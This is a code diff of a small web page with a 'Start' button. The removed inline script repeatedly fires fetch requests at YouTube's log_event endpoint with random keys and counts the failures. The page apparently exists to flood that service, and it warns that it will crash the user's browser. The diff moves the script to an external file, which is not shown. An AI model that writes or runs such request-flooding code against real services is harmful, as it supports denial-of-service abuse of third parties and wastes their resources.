@@ -12,22 +12,6 @@
     <button class="btn" onclick="activate()">Start</button>
     <p class="warning">Will crash ur browser after a while</p>
 
-    <script>
-      const activate = () => {
-        setInterval(async () => {
-          const random = (Math.random() * 10 * Math.PI).toString();
-          const el = document.getElementById('requests');
-
-          try {
-            await fetch(
-              `https://www.youtube.com/youtubei/v1/log_event?alt=json&key=${random}`
-            );
-          } catch (err) {
-            const requests = parseInt(el.innerHTML);
-            el.innerHTML = requests + 1;
-          }
-        }, 0);
-      };
-    </script>
+    <script src="./js/script.js"></script>
   </body>
 </html>
